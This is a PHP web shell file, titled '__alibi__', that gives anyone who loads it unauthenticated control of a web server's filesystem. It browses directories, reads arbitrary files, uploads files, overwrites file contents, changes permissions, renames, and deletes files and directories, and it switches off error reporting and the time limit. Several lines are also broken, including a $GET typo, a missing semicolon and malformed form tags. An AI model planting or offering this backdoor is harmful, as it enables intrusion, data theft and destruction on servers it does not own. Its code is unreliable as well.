<?php
// suppress error reporting
error_reporting(0);

// remove time limit for script execution
set_time_limit(0);

// magic quotes automatically escape (add slashes) to all GET, POST, COOKIE data
if (get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
		// iterate over each POST variable
		$_POST[$key] = stripslashes($value);
		// stripslashes removes added slashes
	}
}

// HTML output
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>__alibi__</title>
<style>


body{
    font-family: "Typesenses", cursive;
    background-position:fixed;
    text-shadow:text-shadow:black 2px 0px 12px; color:#6A0888;
}

#content tr:hover{
    background-color: #FFBF00;
    color:#6A0888;
}
#content .first{
    background-color: #FFBF00;
}
#content .first:hover{
    background-color:  #FFBF00;
    color:#6A0888;
}
table{
    border: 1px #FEFEFE dotted;
}
H1{
    font-family: "Typesenses", cursive;
}
a{
    color: black;
    text-decoration: none;
}
a:hover{
    color: black;
    color:black;
}


input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
</HTML>'

// display current path
echo '<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>current path: ';
if(isset($_GET['path'])){
	$path = base64_decode($GET['path']);
}else{
	$path = getcwd();
}
$pathen = base64_encode($path);
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

// display each part of the path as a link
foreach($paths as $id=>$pat){
	if($pat == '' && $id == 0){
		$a = true;
		echo '<a href="?path='.base64_encode("/").'">/</a>';
		continue;
	}
	if($pat == '') continue;
	echo '<a href="?path=';
	$linkpath = '';
	for($i=0;$i<=$id;$i++){
		$linkpath .= "$paths[$i]";
		if($i != $id) $linkpath .= "/";
	}
	echo base64_encode($linkpath);
	echo '">'.$pat.'</a>/';
}

// handle file upload
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
	if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
		echo '<font color="green">file upload complete!</font><br />';
	}else{
		echo '<font color="red">file upload error!</font><br />';
	}
}

// form for file upload
echo '<form enctype="multipart/form-data" method="POST">
upload file: <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';

// handle file viewing
if(isset($_GET['filesrc'])){
	echo "<tr><td>current file: ";
	echo base64_decode($_GET['filesrc']);
	echo '</tr></td></table><br />';
	echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
}
// handle file operations
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
	echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
	if($_POST['opt'] == 'chmod'){
		if(isset($_POST['perm'])){
			if(chmod($_POST['path'],$_POST['perm'])){
				echo '<font color="green">permissions changed!</font><br />';
			}else{
				echo '<font color="red">permission change error!</font><br />';
			}
		}
		echo '<form method="POST">
		permission: <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type ="hidden" name="opt" value="chmod">
		<input type="submit" value="Go" />
		</form>';
	}elseif($_POST['opt'] == 'rename'){
		if(isset($_POST['newname'])){
			if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
				echo '<font color="green">name changed!</font><br />';
			}else{
				echo '<font color="red">name change error!</font><br />';
			}
			$_POST['name'] = $_POST['newname'];
		}
		echo 'form method="POST">
		new name: <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="rename">
		<input type="submit" value="Go" />
		</form>';
	}elseif($_POST['opt'] == 'edit'){
		if(isset($_POST['src'])){
			// open file
			$fp = fopen($_POST['path'],'w');
			// write new content to file
			if(fwrite($fp,$_POST['src'])){
				echo '<font color="green"> file edited!</font><br />';
			}else{
				echo '<font color="red">file edit error!</font><br />';
			}
			// close file
			fclose($fp);
		}
		// form for editing the file
		echo '<form method="POST">
		<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type"hidden" name="opt" value="edit">
		input type="submit" value="Go" />
		</form>';
	}
	echo '</center>';
}else{
	echo '</table><br /><center>';
	// file + directory deletion
	if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
		if($_POST['type'] == 'dir'){
			if(rmdir($_POST['path'])){
				echo '<font color="green">directory deleted!</font><br />';
			}else{
				echo '<font color="red"><directory delete error!</font><br />';
			}
		}elseif($_POST['type'] == 'file'){
			if(unlink($_POST['path'])){
				echo '<font color="green">file deleted!</font><br />';
			}else{
				echo '<font color="red">file delete error!</font><br />';
			}
		}
	}
	echo '</center>';
	// list all files + directories in the current directory
	$scandir = scandir($path);
	echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr class="first">
	<td><center>name</center></td>
	<td><center>size</center></td>
	<td><center>permissions</center></td>
	<td><center>options</center></td>
	</tr>';

	// list directories
	foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        $dirlink = base64_encode("$path/$dir");
        echo "<tr>
        <td><a href=\"?path=$dirlink\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">delete</option>
        <option value=\"chmod\">chmod</option>
        <option value=\"rename\">rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }

    // list files
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }
        $filelink = base64_encode("$path/$file");
        echo "<tr>
        <td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        // check if file is writable or not readable
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '</BODY>
</HTML>';

// get file permissions in readable format
function perms($file){
    $perms = @fileperms($file);

    // decode file permissions
    if (($perms & 0xC000) == 0xC000) {
        // socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // symlink
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // unknown
        $info = 'u';
    }

    // owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

    // group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

    // world
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>